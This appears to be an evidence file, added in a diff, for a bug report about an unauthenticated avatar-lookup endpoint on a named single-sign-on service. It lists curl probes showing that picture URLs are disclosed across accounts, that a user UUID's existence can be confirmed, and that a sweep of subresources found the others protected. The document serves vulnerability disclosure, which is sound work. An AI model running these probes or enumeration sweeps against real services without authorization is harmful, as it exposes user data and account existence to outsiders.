@@ -1,0 +1,43 @@
+# Evidence — unauthenticated avatar lookup
+# Date: 2026-11-23T07:29Z (UTC)
+# Account A uuid: d8946fad-2b8e-4cf0-82c5-5d955b57b829
+# Account B uuid: 7c5aab2b-e568-40de-a7a5-ec27df1db94b
+
+## 1. No cookie at all (unauthenticated) — Account B avatar disclosed
+$ curl -A 'Mozilla/5.0' https://sso.ui.com/api/sso/v1/user/7c5aab2b-e568-40de-a7a5-ec27df1db94b/picture
+HTTP 200
+{"picture":"https://account-cdn.svc.ui.com/7559541d-9df5-4f4e-a2bb-573eab97626e"}
+
+## 2. Random UUID (no cookie) — existence oracle
+$ curl -A 'Mozilla/5.0' https://sso.ui.com/api/sso/v1/user/11111111-1111-1111-1111-111111111111/picture
+HTTP 404
+{"detail":"No SSOUser matches the given query.","error":"ERROR"}
+
+## 3. Baseline: same host, sibling user-scoped endpoints require auth
+$ curl https://sso.ui.com/api/sso/v1/user/7c5aab2b-e568-40de-a7a5-ec27df1db94b
+HTTP 401  {"detail":"is not allowed"}
+$ curl https://sso.ui.com/api/sso/v1/user/7c5aab2b-e568-40de-a7a5-ec27df1db94b/address
+HTTP 401  {"detail":"is not allowed"}
+
+## 4. With Account A's session — cross-account picture (same as unauth)
+$ curl -H 'Cookie: UBIC_AUTH=<A>' https://sso.ui.com/api/sso/v1/user/7c5aab2b-e568-40de-a7a5-ec27df1db94b/picture
+HTTP 200  {"picture":"https://account-cdn.svc.ui.com/7559541d-9df5-4f4e-a2bb-573eab97626e"}
+
+## 5. With Account A's session — other B resources are protected
+GET /user/{B}            -> 403 {"detail":"mismatching UUID","error":"..."}
+GET /user/{B}/address    -> 403 mismatching UUID
+POST /user/{B}/picture   -> 403 mismatching UUID
+PUT  /user/{B}/picture   -> 405
+DELETE /user/{B}/picture -> 403 mismatching UUID
+POST /user/{B}/roles/beta (A) -> 403 mismatching UUID ; (B own) -> 204 ; (unauth) -> 401
+
+## 6. Query parameters do not expand the response
+?include=email,username / ?expand=all / ?full=true / ?settings=true / ?include=tenant
+-> all HTTP 200, identical body {"picture":"..."}
+
+## 7. Subresource sweep unauthenticated (Account B uuid)
+Only "picture" returned 200; every other tested subresource was 401 (auth required)
+or 404 (nonexistent route): address, addresses, email, phone, roles, 2fa, mfa,
+passkeys, settings, preferences, notifications, subscriptions, consoles,
+organizations, tenants, billing, zendesk_user, activity, status, token, tokens,
+picture_info, avatar, profile, details, security, password, username.
